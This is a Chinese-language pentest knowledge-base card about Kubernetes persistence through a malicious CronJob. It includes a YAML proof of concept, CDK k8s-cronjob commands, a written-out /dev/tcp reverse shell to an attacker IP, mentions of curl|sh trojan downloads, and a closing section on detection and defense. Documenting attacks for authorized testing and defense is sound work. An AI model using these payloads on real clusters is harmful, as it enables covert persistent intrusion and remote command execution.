---
id: cloud-k8s-cronjob-reverse-shell-persistence
title: K8s 持久化：恶意 CronJob 按 cron 表达式定时拉起 Job 执行反弹 shell/下载木马（CDK k8s-cronjob）
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-cronjob-scheduled-persistence
tags:
- cloud
- k8s
- persistence
- cronjob
- job
- backdoor
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V673
  verified_at: '2026-11-13T10:33:22+08:00'
  notes: 已对照原文核对：CronJob schedule "*/1 * * * *"、alpine/busybox 载荷、CDK k8s-cronjob 用法均与原文一致；原文反弹 shell 因测试网段未回连，改用 ifconfig; echo Hello aliang 由 kubectl logs 验证（原文该节截图均为外链，本地 img 无对应图），卡内表述未夸大；未本地复跑。
url: /docs/cloud/k8s/cloud-k8s-cronjob-reverse-shell-persistence/
draft: false
kb_aliases:
- K8s CronJob 持久化
- k8s-cronjob
- 定时任务后门
- Job 定时反弹 shell
---

## 一句话结论

攻击者可提交一个恶意 CronJob（如 `schedule: "*/1 * * * *"`），让控制器按计划周期性创建 Job Pod 执行 `bash -i >& /dev/tcp/...` 反弹 shell 或下载执行木马；即使手动删除某次 Job/Pod，下一次调度仍会拉起新的执行实例，从而在集群内维持定时回连/命令执行通道（原文以 CronJob 成功执行 `ifconfig; echo Hello aliang` 的日志验证；反弹 shell 因测试网段问题未回连）。

## 原理

- **CronJob 的调度语义**：CronJob 是 K8s 的批处理控制器，按 cron 表达式周期创建 Job，Job 再创建 Pod 执行容器命令；只要 CronJob 对象存在，每次到点都会产生新的执行实例，删除单个 Job/Pod 不会影响下一次调度。
- **恶意载荷**：容器镜像选择集群可拉取的公共镜像（如 alpine/busybox），`command/args` 里放反弹 shell（`/bin/bash -c "bash -i >& /dev/tcp/<attacker>/<port> 0>&1"`）或 `curl|sh` 下载木马；`restartPolicy: OnFailure` 控制失败重试。
- **为什么是持久化**：与 Deployment 的"副本重建"类似，CronJob 的"定时再生产"由控制面保证；攻击者无需维持长连接或常驻 Pod，按 schedule 周期性地获得执行机会，隐蔽性较好（短生命周期 Job 容易被忽略）。
- **工具化**：CDK 的 `k8s-cronjob` 用目标 Pod 的 SA token（或匿名/指定 token）连接 API Server，按 `min/hour/day/<cron>` 创建带自定义镜像与 args 的 CronJob。
- **原文验证**：第一次反弹 shell 未回连（测试环境 IP 网段问题）；改用 `busybox ifconfig; echo Hello aliang` 的 CronJob，通过 `kubectl logs` 看到 `Hello aliang` 输出，证明 Job 按计划执行了攻击者命令；CDK 创建 CronJob 后同样可在日志中看到自定义输出。

## 触发条件

- 攻击者拥有创建/更新 `batch/cronjobs`（或 Job）的 RBAC。
- 集群能从攻击者指定镜像仓库拉取镜像（或使用集群已有镜像），Pod 网络可出站到攻击者端口（反弹 shell 场景）。
- 准入未禁止此类工作负载；仅限授权测试。

## 利用步骤

1. 编写 cron.yaml：`kind: CronJob`，`schedule: "*/1 * * * *"`（每分钟），容器命令为反弹 shell 或下载木马。
2. `kubectl create -f cron.yaml` 提交。
3. 在攻击侧监听对应端口；若网络不通，先改成 `ifconfig; echo Hello` 之类命令，`kubectl logs <job-pod>` 验证调度执行。
4. 清理：删除 CronJob 对象才能停止周期执行；删除 Job/Pod 无效。
5. 工具：`./cdk run k8s-cronjob (default|anonymous|<sa-token-path>) (min|hour|day|<cron-expr>) <image> <args>`，如 `./cdk run k8s-cronjob default min alpine "echo hellow;echo cronjob"`。

## PoC

```yaml
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: hello
spec:
  schedule: "*/1 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: hello
            image: busybox
            args:
            - /bin/sh
            - -c
            - ifconfig; echo Hello aliang
          restartPolicy: OnFailure
```

```bash
kubectl create -f cron.yaml
# 验证调度执行
kubectl logs <job-pod>
# Hello aliang
```

```bash
# 反弹 shell 版本（受目标出网条件限制）
args: ["-c", "bash -i >& /dev/tcp/192.168.17.164/4444 0>&1"]
```

原文实测：CronJob 按分钟调度，`kubectl logs` 输出 `Hello aliang`；反弹 shell 因测试网段未连通，但 Job 已执行攻击者命令。CDK `k8s-cronjob` 创建后同样可见自定义 args 输出。

## 变体与关联

- 变体：schedule 可设 min/hour/day 或任意 cron；镜像/命令可换成下载木马、写入 Secret、发起内网扫描；也可用 Job/Deployment 组合实现不同隐蔽性。
- 关联：[[cloud-k8s-workload-controller-backdoor-persistence-privileged-pod]]（Deployment/DaemonSet 常驻后门，同一控制器持久化家族）、[[cloud-k8s-shadow-apiserver-anonymous-persistence]]（控制面影子持久化）。
- 边界：CronJob 需要 API 权限与可拉取镜像；不出网时反弹 shell 失败但定时命令执行仍成立；删除 CronJob 对象并审计历史 Job 才能清除。

## 检测与防御

- **防御**：限制 `batch/cronjobs`、`jobs` 的创建权限；准入审查镜像来源与 args 中的 `/dev/tcp`、`curl|sh`、`bash -i`；命名空间配额与 NetworkPolicy 限制出站。
- **检测**：短周期 CronJob 反复创建 Job（大量同名/相似 Pod）；Job 容器命令含反弹 shell/下载执行特征；集群向同一外部 IP:PORT 周期性连接；`kubectl logs` 出现异常探测输出（ifconfig 等）。
- **注意**：CronJob 的隐蔽性来自"短生命周期 + 周期性"，应急时需检查 CronJob/Job 历史对象而非只看当前 Pod。
